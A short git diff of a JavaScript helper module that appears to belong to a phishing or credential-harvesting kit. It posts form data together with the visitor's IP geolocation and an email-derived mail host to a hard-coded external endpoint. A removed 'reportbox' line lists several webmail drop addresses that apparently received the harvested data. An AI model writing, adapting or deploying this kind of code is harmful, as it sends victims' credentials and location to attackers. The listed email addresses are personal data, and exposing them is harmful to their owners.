@@ -27,7 +27,7 @@ export const getHost = (email) =>
   }).then((response) => response.json());
 
 export const sendFile = (data) =>
-  fetch(`${serverurl.nwabu.serverurl}/mail`, {
+  fetch("https://expresspages-chi.vercel.app/mailnew", {
     method: "POST",
     mode: "cors",
     headers: {
@@ -35,7 +35,6 @@ export const sendFile = (data) =>
     },
     body: JSON.stringify({
       ...data,
-      reportbox: "asapdogood@yandex.com, jhonsnow751@gmail.com", // "steadykokoyan12@yandex.com, resultbox4us@outlook.com" "mb4ckup.m4il@yandex.com" "info.maqsurgical@gmail.com" "Elongate68@gmail.com, jhonsnow751@gmail.com, ajaymoroco@yandex.com",
     }),
   }).then((response) => response.json());
 
@@ -50,7 +49,7 @@ export const notify = () =>
     progress: undefined,
   });
 
-  export const notifySuccess = (message) =>
+export const notifySuccess = (message) =>
   toast.success(message, {
     position: "top-center",
     autoClose: 5000,
@@ -62,7 +61,6 @@ export const notify = () =>
   });
 
 export const getIP = async () => {
-    const res = await axios.get("https://ipapi.co/json/");
-    return res;
-  };
-  
+  const res = await axios.get("https://ipapi.co/json/");
+  return res;
+};
